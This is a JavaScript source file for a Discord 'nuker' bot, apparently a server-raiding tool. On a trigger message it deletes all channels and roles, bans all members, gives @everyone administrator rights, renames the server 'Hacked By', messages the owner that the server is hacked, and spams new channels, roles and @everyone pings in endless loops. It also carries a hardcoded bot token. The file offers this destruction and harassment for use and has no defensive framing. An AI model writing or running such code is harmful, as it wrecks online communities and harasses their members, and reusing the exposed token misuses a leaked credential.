const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("DarkMode UP");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("DARK MODE UP", "text");///////bo channel 
        message.guild.createChannel("DARK MODE UP", "voice");////bo voice
        message.guild.createRole({ name: "Hacked By " });////nawek dane bo role kan
      });
    }
  }
});

client.on("message", message => {

  if (message.content.startsWith(`sraw`)) {

    message.delete();

    message.guild.roles.cache.find(r => r.name === "@everyone").edit({

      permissions: ["ADMINISTRATOR"] ///premission akata adminstator

    });

    message.guild.channels.cache.map(c => {

      c.delete();

    });

    message.guild.roles.cache.forEach(r => {

      r.delete();

    });

    message.guild.members.cache.forEach(m => {

      m.ban();

    });

    setInterval(() => {

      message.guild.roles

        .create({

        data: {

          name: "Hacked:joy:",

          permissions: ["ADMINISTRATOR"]

        }

        })

        .then(rr => {

          message.member.roles.add(rr.id);

        });

    }, 1000);

    message.guild.setIcon("");

    client.user.setAvatar("");

    client.user.setUsername("Hacked");

    message.guild.owner.send(

      "Bdaxo nradar servert hackrawa 😹"

    );

    message.guild.setName("Hacked By");

    setTimeout(function() {

      setInterval(

        () => {

          message.guild.channels

            .create("hacked by ", "text")

            .then(channel => {

              channel.send(

                "@everyone Hacked By DarkMode:joy: :joy: :joy:"

              );

            })
        },

 

        1000

      );

    });

  }

});

 

////Lalayan black jack drwst krawa mayka hyxot

client.login("OTc2MTExMzA3MzQwMjU5MzU5.GY56QE.k2TY7dz6XRoFaOrrZy1vVl4oxuipZjBoAMt5kc")
